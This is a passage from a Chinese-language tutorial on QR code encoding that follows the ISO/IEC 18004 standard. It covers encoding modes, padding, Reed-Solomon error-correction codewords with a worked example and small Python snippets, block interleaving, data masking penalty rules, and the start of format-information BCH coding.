\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0010 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 000000101 \uff085\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u957f\u5ea6\u4e3a9\uff09 \u6570\u636e\uff1aAC-42 -> 10 12 41 4 2 -> (10 12)(41 4)(2) 10 12 -> 10*45+12=462 -> 00111001110 41 4 -> 41*45+4=1849 -> 11100111001 2 -> 2 -> 000010 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0010 000000101 00111001110 11100111001 000010 \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a \\[B=M+C+11\\times\\lfloor\\frac{D}{2}\\rfloor+6\\times(D\\bmod 2)\\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6 \u5b57\u8282\u6a21\u5f0f\uff087.4.5\uff09 \u00b6 \u5b57\u8282\u6a21\u5f0f\uff08Byte mode\uff09\u4e0b\u628a\u6bcf\u4e2a\u5b57\u7b26\u6839\u636e Latin-1\uff08ISO/IEC 8859-1\uff09\u7f16\u7801\u6210 8 bits\uff081\u5b57\u8282\uff09\uff0c\u76f4\u63a5\u63a5\u5728\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26 0100 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09\u7684\u540e\u9762\u3002 Latin-1 \u5b57\u8282\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\uff1a \\[B=M+C+8\\times D\\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6 \u4e2d\u6587\u7f16\u7801 \u00b6 \u4e2d\u6587\u5728\u8f6c\u6362\u6210\u6bd4\u7279\u6d41\u7684\u65f6\u5019\u4e5f\u4f7f\u7528\u5b57\u8282\u6a21\u5f0f\uff0c\u9700\u8981\u7528 UTF-8 \u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u4f1a\u88ab\u7f16\u7801\u6210 3 \u4e2a\u5b57\u8282 \u6df7\u5408\u6a21\u5f0f\uff087.4.7\uff09 \u00b6 \u4e00\u4e2a\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u6d41\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u6a21\u5f0f\uff0c\u4e14\u4e0d\u9700\u8981\u7279\u522b\u8868\u793a\u3002\u66f4\u6362\u65b0\u7684\u6a21\u5f0f\u65f6\u53ea\u9700\u8981\u6b63\u5e38\u6dfb\u52a0 \u6a21\u5f0f\u6807\u8bc6\u7b26+\u6570\u91cf\u6807\u8bc6\u7b26+\u6570\u636e \u5373\u53ef \u4f8b\u5b50 \u539f\u59cb\u6570\u636e\uff1a123\u6d4b\u8bd5 \u6570\u636e\u6d41\uff1a \u6570\u5b57\u6a21\u5f0f\uff1a \u6807\u8bc6\u7b26\uff1a 0001 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 0000000011 \uff083\uff0c\u957f\u5ea610\uff09 \u6570\u636e\uff1a123 -> 0001111011 \u5b57\u8282\u6a21\u5f0f\uff1a\u6d4b\u8bd5 -> E6 B5 8B / E8 AF 95 \u6807\u8bc6\u7b26\uff1a 0100 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 00000110 \uff086\uff0c\u957f\u5ea68\uff09 \u6570\u636e\uff1a \u6d4b -> 11100110 10110101 10001011 \u8bd5 -> 11101000 10101111 10010101 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0001 0000000011 0001111011 0100 00000110 11100110 10110101 10001011 11101000 10101111 10010101 \u7ed3\u675f\u7b26\uff087.4.9\uff09 \u00b6 \u5728\u6570\u636e\u7684\u672b\u5c3e\u8981\u586b\u51454\u4e2a0\u4f5c\u4e3a\u7ed3\u675f\u7b26\uff0c\u5982\u679c\u5bb9\u91cf\u4e0d\u8db3\u7684\u8bdd\u53ef\u4ee5\u7f29\u77ed\u6216\u7701\u7565 \u5373\u80fd\u586b\u4e0b\u5219\u52a04\u4e2a0\uff0c\u586b\u4e0d\u4e0b\u5219\u80fd\u52a0\u51e0\u4e2a0\u5c31\u52a0\u51e0\u4e2a0 \u586b\u5145 padding bits\uff087.4.10\uff09 \u00b6 \u8f6c\u6362\u540e\u7684\u6570\u636e\u6bd4\u7279\u6d41\u8fd8\u9700\u8981\u586b\u5145\u81f3\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u5bb9\u91cf \u9996\u5148\u5148\u7528 0 \u8865\u5145\u6bd4\u7279\u6d41\u957f\u5ea6\u5230 8 \u7684\u6574\u6570\u500d \u7136\u540e\u7528 11101100 \u548c 00010001 \u4ea4\u66ff\u586b\u8865\u5230\u4e8c\u7ef4\u7801\u6570\u636e\u5bb9\u91cf \u5177\u4f53\u7684\u6570\u636e\u5bb9\u91cf\u7531\u7248\u672c\u53f7\u548c\u7ea0\u9519\u7b49\u7ea7\u51b3\u5b9a\uff0c\u4e14\u6570\u636e\u5bb9\u91cf\uff08\u6bd4\u7279\uff09\u4e00\u5b9a\u4e3a8\u7684\u500d\u6570\uff0c\u5b8c\u6574\u6570\u636e\u89c1\u6587\u6863\u7684 33\uff5e36 \u9875\uff08\u6574\u4e2a pdf \u7684\u7b2c 41\uff5e44 \u9875\uff09 \u6ce8 \u8fd9\u4e2a\u5730\u65b9 QRazyBox \u7f51\u7ad9\u5b58\u5728 bug\uff0c\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u8bc6\u522b\u586b\u5145\u7684 0 \u6bd4\u7279\u548c padding bits\uff08\u5373\u53ef\u80fd\u628a\u586b\u5145\u7684 0 \u4e2d\u524d\u56db\u4e2a\u89c6\u4e3a\u4e00\u4e2a terminator\uff0c\u628a\u540e\u9762\u7684 0 \u624d\u89c6\u4e3a\u5c5e\u4e8e padding bits \uff09 \u7ea0\u9519\u7801\u7f16\u7801\uff087.5\uff09 \u00b6 \u7ea0\u9519\u5bb9\u91cf\uff087.5.1\uff09 \u00b6 \u7ea0\u9519\u5b57\uff08error correction codewords\uff09\u53ef\u4ee5\u7ea0\u6b63\u4e24\u79cd\u9519\u8bef\uff0c\u4e00\u79cd\u662f\u6bd4\u5982\u65e0\u6cd5\u626b\u63cf\u6216\u65e0\u6cd5\u89e3\u7801\u7684\u5df2\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08erasures\uff09\uff0c\u4e00\u79cd\u662f\u672a\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08errors\uff09\uff0c\u4e00\u4e2a erasures \u53ef\u4ee5\u7531\u4e00\u4e2a\u7ea0\u9519\u5b57\u7ea0\u9519\uff0c\u800c\u4e00\u4e2a errors \u9700\u8981\u4e24\u4e2a\u7ea0\u9519\u5b57\u6765\u7ea0\u9519 \u53ef\u4ee5\u7ea0\u9519\u7684 erasures \u548c errors \u7684\u6570\u91cf\u6ee1\u8db3\uff1a \\[e+2t\\leq d-p\\] \u5176\u4e2d \\(e\\) \u662f erasures \u7684\u6570\u91cf\uff0c \\(t\\) \u662f errors \u7684\u6570\u91cf\uff0c \\(d\\) \u662f\u7ea0\u9519\u5b57\u7684\u6570\u91cf\uff0c \\(p\\) \u662f\u88ab\u9519\u8bef\u89e3\u6790\u7684\u4fdd\u62a4\u5b57\u6570\u91cf \u5176\u4e2d \\(p\\) \u7531\u7248\u672c\u51b3\u5b9a\uff1a \\(p=3\\) \uff1a\u7248\u672c 1-L \\(p=2\\) \uff1a\u7248\u672c 1-M\u30012-L \\(p=1\\) \uff1a\u7248\u672c 1-Q\u30011-H\u30013-L \\(p=0\\) \uff1a\u5176\u4ed6\u6240\u6709\u7248\u672c \u5206\u5757\u7f16\u7801\u7ea0\u9519\u7801 \u00b6 \u6839\u636e\u7248\u672c\u53f7\u53ca\u7ea0\u9519\u7b49\u7ea7\uff0c\u6570\u636e\u5e8f\u5217\u9700\u8981\u88ab\u5206\u6210 1 \u4e2a\u6216\u591a\u4e2a\u5757\uff0c\u6bcf\u5757\u5185\u9700\u8981\u5355\u72ec\u7f16\u7801\u7ea0\u9519\u7801 \u5982\u679c\u9700\u8981\u8865\u5145\u7684\u8bdd\u4e00\u5f8b\u5168\u90e8\u8865\u5145 0 \u6bd4\u7279\u5230\u9700\u8981\u7684\u957f\u5ea6 \u5177\u4f53\u4e0d\u540c\u7248\u672c\u7684\u5206\u5757\u5757\u6570\u548c\u6bcf\u5757\u4e2d\u6570\u91cf\u5b89\u6392\u4ee5\u53ca\u7ea0\u9519\u5bb9\u91cf\u90fd\u5728\u6587\u6863\u4e2d P38-44\uff08pdf \u4e2d P46-52\uff09\u7684\u5927\u8868\u683c Table 9 \u4e2d \u751f\u6210\u7ea0\u9519\u7801\uff087.5.2\uff09 \u00b6 \u4f3d\u7f57\u74e6\u57df \u00b6 \u751f\u6210\u7ea0\u9519\u7801\u4e4b\u524d\u8981\u5148\u5c06\u6240\u6709\u6570\u636e\u5b57\u8f6c\u6362\u6210\u4e00\u4e2a\u591a\u9879\u5f0f\uff0c\u4f7f\u5176\u9650\u5236\u4e8e\u4f3d\u7f57\u74e6\u57df \\(GF(2^3)\\bmod 100011101\\) \u4e2d\uff0c\u800c\u4e14\u540e\u7eed\u7684\u56db\u5219\u8fd0\u7b97\u4e5f\u90fd\u662f\u8be5\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u8fd0\u7b97 \u5177\u4f53\u4f3d\u7f57\u74e6\u57df\u7684\u751f\u6210\u539f\u7406\u53ef\u4ee5\u770b\uff1a https://www.codenong.com/cs105738710/ \u7b80\u5355\u6765\u8bf4\u5c31\u662f\u591a\u9879\u5f0f\u7684\u52a0\u51cf\u6cd5\u90fd\u662f\u5f02\u6216\uff0c\u4e58\u9664\u6cd5\u8981\u6bcf\u4e00\u4e2a\u6bd4\u7279\u6a21 2\uff0c\u6bcf\u4e00\u4e2a\u5b57\u8282\u6a21 100011101\uff08\u5373\u8be5\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u672c\u539f\u591a\u9879\u5f0f \\(x^8+x^4+x^3+x^2+1\\) \uff09 \u5177\u4f53\u591a\u9879\u5f0f mod \u8fd0\u7b97\u7684\u65b9\u6cd5\u53ef\u4ee5\u770b\uff1a https://blog.csdn.net/yaongtime/article/details/17200401 \u7b80\u5355\u6765\u8bf4\u5c31\u662f\u591a\u9879\u5f0f\u7684\u957f\u9664\u6cd5\u53d6\u6a21\uff0c\u800c\u4e14\u6ce8\u610f\u8fd9\u91cc\u7684\u52a0\u51cf\u90fd\u662f\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u52a0\u51cf\uff0c\u5373\u5f02\u6216 \u751f\u6210\u591a\u9879\u5f0f\uff08Annex A\uff09 \u00b6 \u7ea0\u9519\u7801\u751f\u6210\u591a\u9879\u5f0f\u7684\u4e00\u822c\u8868\u8fbe\u5f62\u5f0f\u662f\uff1a \\[g(x)=(x-\\alpha^0)(x-\\alpha^1)\\cdots(x-\\alpha^{n-1})\\] \u5176\u4e2d \\(n\\) \u4e3a\u7ea0\u9519\u7801\u5b57\u7684\u4e2a\u6570\uff0c\u5176\u4e2d \\(\\alpha=2\\) \uff0c \\(\\alpha^k\\) \u7684\u662f\u5728\u4f3d\u7f57\u74e6\u57df\u4e0b\u7684\u8fd0\u7b97\uff0c\u5373\uff1a \\(\\alpha^0 = 1;\\ \\alpha^1=2;\\ \\alpha^2=4;\\ \\cdots;\\ \\alpha^7=128\\) \\(\\alpha^8=256\\bmod 285=256\\oplus 285=29;\\ \\alpha^9=29\\times2=58;\\ \\cdots\\) \u5177\u4f53\u8ba1\u7b97 \\(\\alpha^k\\) \u7684\u4ee3\u7801\uff1a def alpha ( k ): res = 1 for _ in range ( k ): res *= 2 if res >= 256 : res ^= 285 return res \u6587\u6863\u9644\u5f55 A \u4e2d\u5df2\u7ecf\u5c55\u5f00\u4e86\u6240\u6709\u53ef\u80fd \\(n\\) \u503c\u4e0b\u768436\u4e2a\u751f\u6210\u591a\u9879\u5f0f \u751f\u6210\u7ea0\u9519\u7801 \u00b6 \u6587\u6863\u91cc\u7ed9\u4e86\u4e00\u4e2a\u611f\u89c9\u6bd4\u8f83\u6666\u6da9\u96be\u61c2\u7684\u56fe\u6765\u5c55\u793a\u751f\u6210\u7ea0\u9519\u7801\u7684\u8fc7\u7a0b\uff1a \u4e0d\u662f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u4e8e\u662f\u627e\u4e86\u53e6\u4e00\u7bc7\u6587\u7ae0\uff1a https://blog.csdn.net/ljm1995/article/details/88819664 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6bd4\u5982\u8981\u7f16\u7801 12345678 \u8fd9\u516b\u4e2a\u6570\u5b57 \u7248\u672c 1-L\uff0c\u67e5 Table 9 \u5f97\u5230\u5206\u4e3a 1 \u5757\uff0c\u4e14\u8be5\u5757\u5185\u603b\u5b57\u6570\u4e3a 26\uff0c\u6570\u636e\u5b57\u6570\u4e3a 19\uff0c\u7ea0\u9519\u5b57\u6570\u4e3a 26-19=7 \u6839\u636e\u524d\u9762\u6240\u8bf4\uff0c\u6bd4\u7279\u6d41\u5e94\u8be5\u662f\uff1a 0001 0000001000 0001111011 0111001000 1001110 0000 \u8865\u6210 8 \u7684\u500d\u6570\u957f\u5ea6\uff1a 00010000 00100000 01111011 01110010 00100111 00000000 \u6dfb\u52a0 padding bits\uff08\u8865\u5230 19 \u4e2a\u5b57\u8282\uff09\uff1a 00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 \u5199\u6210\u591a\u9879\u5f0f\u5f62\u5f0f\uff0c\u6b21\u6570\u662f 19 \u6b21\uff0c\u6574\u4f53\u4e58 \\(x^7\\) \uff1a \\[16x^{25}+32x^{24}+123x^{23}+114x^{22}+39x^{21}+236x^{19}+\\\\\\\\17x^{18}+236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\\\\\\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}\\] \u518d\u67e5\u9644\u5f55 A \u5f97\u5230\u6b21\u6570\u4e3a 7 \u7684\u751f\u6210\u591a\u9879\u5f0f\uff0c\u5e76\u6574\u4f53\u4e58 \\(x^{18}\\) \uff1a \\[x^{25}+\\alpha^{87}x^{24}+\\alpha^{229}x^{23}+\\alpha^{146}x^{22}+\\alpha^{149}x^{21}+\\\\\\\\\\alpha^{238}x^{20}+\\alpha^{102}x^{19}+\\alpha^{21}x^{18}\\] \u7136\u540e\u628a\u7b2c\u4e00\u4e2a\u591a\u9879\u5f0f\u9664\u7b2c\u4e8c\u4e2a\u591a\u9879\u5f0f\u53d6\u4f59\u6570 \u53ef\u4ee5\u8fd9\u6837\u8ba1\u7b97\uff0c\u628a\u7b2c\u4e8c\u4e2a\u591a\u9879\u5f0f\u6574\u4f53\u4e58 16 \u5373 \\(\\alpha^4\\) \uff1a \\[\\alpha^4x^{25}+\\alpha^{91}x^{24}+\\alpha^{233}x^{23}+\\alpha^{150}x^{22}+\\alpha^{153}x^{21}+\\\\\\\\\\alpha^{242}x^{20}+\\alpha^{106}x^{19}+\\alpha^{25}x^{18}\\] \u8ba1\u7b97\u51fa\u7cfb\u6570\u7684\u503c\uff1a \\[16x^{25}+163x^{24}+243x^{23}+85x^{22}+146x^{21}+\\\\\\\\176x^{20}+52x^{19}+3x^{18}\\] \u4e4b\u540e\u4e0e\u7b2c\u4e00\u4e2a\u591a\u9879\u5f0f\u5f02\u6216\u5f97\u5230\uff1a \\[131x^{24}+136x^{23}+197x^{22}+181x^{21}+216x^{19}+18x^{18}+\\\\\\\\236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\\\\\\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}\\] \u8fd9\u4e4b\u540e\u6700\u9ad8\u6b21\u5c31\u53d8\u6210\u4e86 24 \u6b21\uff0c\u91cd\u590d\u6574\u4e2a\u8fc7\u7a0b\u76f4\u5230\u7ed3\u679c\u53ea\u5269\u4e0b 7 \u9879\uff08\u5373\u6700\u9ad8\u6b21\u4e3a 6 \u6b21\uff09\u65f6\u5373\u53ef\u5f97\u5230\uff1a \\[188x^6+247x^5+62x^4+248x^3+53x^2+170x+224\\] \u6240\u4ee5\u7ea0\u9519\u7801\u5c31\u662f\uff1a 188 247 62 248 53 170 224 \u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff1a 10111100 11110111 00111110 11111000 00110101 10101010 11100000 \u6240\u4ee5\u6574\u4e2a\u4e8c\u7ef4\u7801\u7684\u7f16\u7801\u533a\u57df\uff08\u9664\u683c\u5f0f\u4fe1\u606f\u5916\uff09\u5168\u90e8\u5185\u5bb9\u5c31\u662f\uff1a 00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 10111100 11110111 00111110 11111000 00110101 10101010 11100000 \u7ea0\u9519\u7801\u53ef\u4ee5\u76f4\u63a5\u7528 python \u7684 reedsolo \u5305\u6765\u6c42\u89e3\uff1a >>> from reedsolo import RSCodec , ReedSolomonError >>> rsc = RSCodec ( 7 ) >>> list ( rsc . encode ([ 16 , 32 , 123 , 114 , 39 , 0 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 ])) [ 16 , 32 , 123 , 114 , 39 , 0 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 188 , 247 , 62 , 248 , 53 , 170 , 224 ] >>> list ( rsc . encode ([ 16 , 32 , 123 , 114 , 39 , 0 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 , 17 , 236 ]))[ - 7 :] [ 188 , 247 , 62 , 248 , 53 , 170 , 224 ] \u5269\u4f59\u6b65\u9aa4\uff087.6~7.10\uff09 \u00b6 \u5408\u6210\u5e8f\u5217\uff087.6\uff09 \u00b6 \u9996\u5148\u6309\u7167 2 \u4e2d\u6240\u8ff0\u7ed9\u5b8c\u6574\u4fe1\u606f\u7f16\u7801\u6210\u6570\u636e\u5e8f\u5217\uff0c\u5176\u4e2d\u4e5f\u5305\u542b padding bits\uff0c\u4e14\u957f\u5ea6\u4e3a 8 \u7684\u500d\u6570 \u7136\u540e\u6839\u636e 3.1.1 \u4e2d\u6240\u8bf4\u5bf9\u6570\u636e\u5e8f\u5217\u8fdb\u884c\u5206\u5757\uff0c\u7136\u540e\u5bf9\u6bcf\u5757\u5206\u522b\u751f\u6210\u7ea0\u9519\u7801 \u6700\u540e\u628a\u6570\u636e\u5e8f\u5217\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4f9d\u6b21\u4ea4\u9519\u5408\u6210\u65b0\u7684\u6570\u636e\u5e8f\u5217\uff0c\u7136\u540e\u628a\u7ea0\u9519\u7801\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4ea4\u9519\u5408\u6210\u7ea0\u9519\u7801\u5e8f\u5217\u3002\u628a\u65b0\u7684\u6570\u636e\u5e8f\u5217\u548c\u7ea0\u9519\u7801\u5e8f\u5217\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u5982\u679c\u603b\u957f\u5ea6\u4e0d\u591f\u4e8c\u7ef4\u7801\u7684\u5bb9\u91cf\uff0c\u5219\u5728\u540e\u9762\u8865\u5145 3/4/7 \u4e2a 0 \u6bd4\u7279\uff08\u9700\u8981\u8865\u591a\u5c11\u5728 Table 1 \u4e2d\u6709\u5b9a\u4e49\uff09 \u800c\u4e14\u8fd9\u6837\u4e5f\u8981\u4fdd\u8bc1\u6700\u77ed\u7684\u6570\u636e\u5757\u5728\u6700\u524d\u9762\uff08\u5df2\u7ecf\u7531 Table 9 \u5b9a\u4e49\uff09 \u6bd4\u5982 5-H \u7248\u672c\u7684\u5e8f\u5217\uff0c\u9700\u8981\u5206\u4e3a 4 \u5757\uff0c\u524d\u4e24\u5757\u662f 11 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff0c\u540e\u4e24\u5757\u662f 12 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff1a \u6700\u540e\u7684\u5e8f\u5217\u5c31\u662f \\(D_1,D_{12},D_{23},D_{35},\\cdots,D_{45},D_{34},D_{46},E_1,E_{23},\\cdots,E_{88}\\) \u586b\u5145\u6570\u636e\uff087.7\uff09 \u00b6 \u628a\u524d\u9762\u5408\u6210\u7684\u5b8c\u6574\u6d88\u606f\u5e8f\u5217\u586b\u5230\u4e8c\u7ef4\u7801\u4e2d\uff0c\u9996\u5148\u8981\u5148\u586b\u5145\u529f\u80fd\u56fe\u6848\uff0c\u7136\u540e\u9884\u7559\u51fa\u683c\u5f0f\u4fe1\u606f\u3001\u7248\u672c\u4fe1\u606f\u7684\u4f4d\u7f6e \u586b\u5145\u65f6\u4ee5\u4e24\u5217\u4e3a\u5355\u4f4d\uff0c\u5373\u6bcf\u6b21\u4ea4\u66ff\u586b\u5145\u4e24\u5217\u3002\u4ece\u6700\u53f3\u4e0b\u89d2\u5f00\u59cb\u662f\u6700\u9ad8\u4f4d\u7684\u6bd4\u7279\uff0c\u7136\u540e\u4ece\u53f3\u5411\u5de6\u4ece\u4e0b\u5411\u4e0a\u4ea4\u66ff\u586b\u5145\uff0c\u5230\u4e86\u4e0a\u754c\u65f6\u5de6\u8f6c\u5411\u4e0b\u7ee7\u7eed\u586b\u5145\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u76f4\u63a5\u7a7f\u8fc7\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u8fb9\u754c\u5219\u53d8\u4e3a\u4e00\u884c \u4e5f\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u6765\u4f9d\u6b21\u586b\u5145\uff0c\u5982\u679c\u662f\u5411\u4e0a\u586b\u5145\uff0c\u5219\u6700\u9ad8\u4f4d\u5728\u4e0b\u7aef\uff0c\u53cd\u4e4b\u5728\u4e0a\u6bb5\u3002\u6bcf\u4e2a\u5b57\u8282\u5757\u5185\u7684\u6700\u9ad8\u4f4d\u5c3d\u91cf\u53d6\u6700\u53f3\u4fa7\u7684\uff0c\u4f46\u5982\u679c\u6700\u4e0b(\u4e0a)\u7aef\u53ea\u6709\u4e00\u4e2a\u6bd4\u7279\u7684\u4f4d\u7f6e\uff0c\u5219\u9009\u5b83\u4f5c\u4e3a\u6700\u9ad8\u6bd4\u7279\u7684\u4f4d\u7f6e \u53cd\u6b63\u6309\u987a\u5e8f\u6b63\u5e38\u586b\u5c31\u884c\u4e86\uff0c\u9047\u5230\u4e1c\u897f\u5c31\u7ed5 \u5177\u4f53\u89c4\u5219 \u63a9\u7801\u906e\u76d6\uff087.8\uff09 \u00b6 \u586b\u5145\u540e\u7684\u6570\u636e\u8fd8\u8981\u906e\u76d6\u4e00\u5c42\u63a9\u7801\uff08\u5f02\u6216\uff09\u6765\u5e73\u8861\u9ed1\u767d\u5757\u7684\u6570\u91cf\uff0c\u4ee5\u53ca\u51cf\u5c11\u5bb9\u6613\u4ea7\u751f\u626b\u63cf\u9519\u8bef\u7684\u5927\u5757\u548c\u5f62\u4f3c\u529f\u80fd\u56fe\u6848\u7684\u90e8\u5206\u51fa\u73b0 QR \u7801\u4e00\u5171\u6709 8 \u79cd\u63a9\u7801\uff0c\u6bcf\u4e2a\u63a9\u7801\u6709\u4e00\u4e2a 3 bits \u7684\u7f16\u53f7\uff0c\u548c\u4e00\u4e2a\u751f\u6210\u516c\u5f0f\u3002\u8fd9\u4e2a\u516c\u5f0f\u7528\u6765\u751f\u6210\u63a9\u7801\u56fe\u6837\uff0c\u4ee5\u5de6\u4e0a\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u3001\u4e0b\u4e3a\u6b63\u65b9\u5411\uff0c\u5750\u6807\u6ee1\u8db3\u8fd9\u4e2a\u516c\u5f0f\u7684\u70b9\u5728\u56fe\u6837\u4e2d\u662f\u9ed1\u8272\uff081\uff09\uff0c\u4e0d\u6ee1\u8db3\u7684\u662f\u767d\u8272\uff080\uff09\u3002\u5728\u7248\u672c 1 \u4e2d\u7684\u63a9\u7801\u56fe\u50cf\u8868\u73b0\u4e3a\uff1a \u8fdb\u884c\u63a9\u7801\u64cd\u4f5c\u5c31\u662f\u628a\u9664\u53bb\u529f\u80fd\u56fe\u6848\u548c\u7248\u672c\u4fe1\u606f\u3001\u683c\u5f0f\u4fe1\u606f\u4e4b\u5916\u7684\u6570\u636e\u90e8\u5206\u6bcf\u4e00\u5757\u7684\u503c\u4e0e\u63a9\u7801\u56fe\u6837\u5f02\u6216 \u6574\u4e2a\u64cd\u4f5c\u9700\u8981\u751f\u6210\u5206\u522b\u4f7f\u7528\u4e0d\u540c\u63a9\u7801\u7684 8 \u4e2a\u56fe\u6837\uff0c\u7136\u540e\u8ba1\u7b97\u51fa\u635f\u5931\u5206\u6570\uff08penalty points score\uff09\uff0c\u7136\u540e\u91c7\u7528\u635f\u5931\u5206\u6570\u6700\u5c0f\u7684\u63a9\u7801\u6a21\u5f0f\u4f5c\u4e3a\u6700\u7ec8\u7684\u63a9\u7801\u6a21\u5f0f \u8ba1\u7b97\u635f\u5931\u5206\u6570\uff087.8.3\uff09 \u00b6 \u867d\u7136\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c\u65f6\u4ec5\u5bf9\u975e\u529f\u80fd\u56fe\u6848\u3001\u975e\u7248\u672c\u4fe1\u606f\u683c\u5f0f\u4fe1\u606f\u7684\u6570\u636e\u533a\u57df\u8fdb\u884c\u63a9\u7801\uff0c\u4f46\u662f\u8ba1\u7b97\u635f\u5931\u5206\u6570\u65f6\u6309\u7167\u6574\u4e2a\u4e8c\u7ef4\u7801\u8ba1\u7b97 \u8ba1\u7b97\u635f\u5931\u5206\u6709\u56db\u4e2a\u89c4\u5219\uff1a \u76f8\u90bb\u4e00\u884c\u6216\u4e00\u5217\u5185\u51fa\u73b0\u8fde\u7eed\u4e94\u4e2a\u76f8\u540c\u989c\u8272\u5757\u65f6\u635f\u5931\u5206 +3\uff0c\u4e4b\u540e\u8fde\u7eed\u5757\u6570\u6bcf\u52a0\u4e00\uff0c\u635f\u5931\u5206 +1 \u5bfb\u627e\u5185\u90e8\u989c\u8272\u76f8\u540c\u7684 2*2 \u7684\u5757\uff0c\u6bcf\u51fa\u73b0\u4e00\u4e2a\u635f\u5931\u5206 +3 \u5728\u6bcf\u884c\u548c\u6bcf\u5217\u4e2d\u5bfb\u627e 10111010000 \u548c 00001011101 \uff0c\u6bcf\u51fa\u73b0\u4e00\u4e2a\u635f\u5931\u5206 +40 \u8bc4\u4f30\u9ed1\u8272\u5757\u5360\u5168\u90e8\u5757\u6570\u7684\u6bd4\u4f8b\uff0c\u5982\u679c\u5728 45%~55% \u95f4\u5219\u4e0d\u589e\u52a0\u635f\u5931\u5206\uff0c\u5728 40%~45%\u300155%~60% \u95f4\u5219\u635f\u5931\u5206 +10\uff0c\u5728 35%~40%\u300160%~65% \u95f4\u5219\u635f\u5931\u5206 +10*2\uff0c\u4ee5\u6b64\u7c7b\u63a8 \u66f4\u8be6\u7ec6\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\uff1a https://www.thonky.com/qr-code-tutorial/data-masking \u7136\u540e\u5bf9\u6240\u6709\u63a9\u7801\u7ed3\u679c\u8ba1\u7b97\u635f\u5931\u5206\u6570\u540e\u9009\u62e9\u5206\u6570\u6700\u4f4e\u7684\u4e00\u4e2a\u4f5c\u4e3a\u6700\u7ec8\u7ed3\u679c \u683c\u5f0f\u4fe1\u606f\uff087.9\uff09 \u00b6 QRCode \u7684\u683c\u5f0f\u4fe1\u606f\u662f 15 bits \u7684\u5e8f\u5217\uff0c\u5176\u4e2d\u524d 5 \u4f4d\u662f\u6570\u636e\uff0c\u540e 10 \u4f4d\u662f\u9488\u5bf9\u683c\u5f0f\u4fe1\u606f\u7684\u7ea0\u9519\u7801\uff08\u7531 (15, 5) BCH \u7801\u751f\u6210\uff09 5 bits \u7684\u6570\u636e\u524d 2 \u4f4d\u662f\u7ea0\u9519\u7b49\u7ea7\u6807\u8bc6\u7b26\uff0c\u5206\u522b\u662f L -> 01 \u3001M -> 00 \u3001Q -> 11 \u3001H -> 10 \u540e 3 \u4f4d\u662f\u4e0a\u9762\u8bf4\u5230\u7684\u63a9\u7801\u7f16\u53f7 \u7136\u540e\u540e\u63a5 10 bits \u7ea0\u9519\u7801\uff0c\u6700\u540e\u6574\u4f53\u5f02\u6216 101010000010010 \u9632\u6b62\u4ea7\u751f\u5168\u96f6\u6570\u636e\u5e8f\u5217 \u751f\u6210\u7ea0\u9519\u7801\uff08Annex C\uff09 \u00b6 \u5148\u5f97\u5230\u524d 5 bits \u7684\u6570\u636e\uff0c\u7136\u540e\u5316\u4e3a\u591a\u9879\u5f0f\uff0c\u6574\u4f53\u4e58 \\(x^{10}\\) \uff0c\u518d\u9664\u4ee5\u751f\u6210\u591a\u9879\u5f0f 